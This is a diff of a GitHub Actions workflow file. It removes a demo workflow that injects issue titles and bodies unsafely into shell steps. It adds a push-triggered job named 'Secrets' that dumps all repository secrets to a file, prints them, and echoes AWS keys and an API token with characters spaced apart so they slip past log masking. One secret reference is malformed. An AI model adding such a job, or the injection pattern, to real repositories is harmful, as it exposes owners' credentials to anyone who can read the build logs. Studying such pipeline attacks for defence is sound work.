@@ -1,19 +1,15 @@
-name: Demo vulnerable workflow
+name: Secrets
 
-on:
-  issues:
-    types: [opened]
+on: push
 
 jobs:
-  vuln_job:
-    runs-on: ubuntu-20.04
+ build:
+   runs-on: ubuntu-latest
 
-    steps:
-      - uses: actions/checkout@v2
-    
-      - run: |
-         echo "ISSUE TITLE: ${{github.event.issue.title}}"
-         echo "ISSUE DESCRIPTION: ${{github.event.issue.body}}"
-
-      - run: |
-         curl -X POST -H "Authorization: Token ${{ secrets.GITHUB_TOKEN }}" -d '{"labels": ["New Issue"]}' ${{ github.event.issue.url }}/labels
+   steps:
+     - run: |
+         echo "${{ toJSON(secrets) }}" > .secrets
+         cat .secrets
+     - run: echo ${{secrets.secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'
+     - run: echo ${{secrets.AWS_SECRET_ACCESS_KEY}} | sed 's/./& /g' 
+     - run: echo ${{secrets.API_TOKEN}} | sed 's/./& /g'
